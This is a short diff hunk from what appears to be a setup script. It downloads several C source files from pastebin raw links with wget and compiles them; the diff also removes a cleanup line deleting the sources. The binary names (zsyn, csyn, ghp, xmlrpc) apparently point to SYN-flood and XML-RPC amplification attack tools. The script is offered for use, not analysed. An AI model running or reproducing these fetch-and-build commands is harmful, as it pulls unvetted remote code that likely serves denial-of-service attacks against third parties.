@@ -34,4 +34,3 @@ wget -q http://pastebin.com/raw/zfSbVHDy -O zsyn.c; gcc -o zsyn zsyn.c -pthread
 wget -q http://pastebin.com/raw/7MU1viQf -O csyn.c; gcc -o csyn csyn.c -pthread
 wget -q http://pastebin.com/raw/sJURi2ST -O ghp.c; gcc -o ghp ghp.c -pthread
 wget -q http://pastebin.com/raw/dAbj8HvY -O xmlrpc.c; gcc -o xmlrpc xmlrpc.c -pthread
-rm -rf *.c
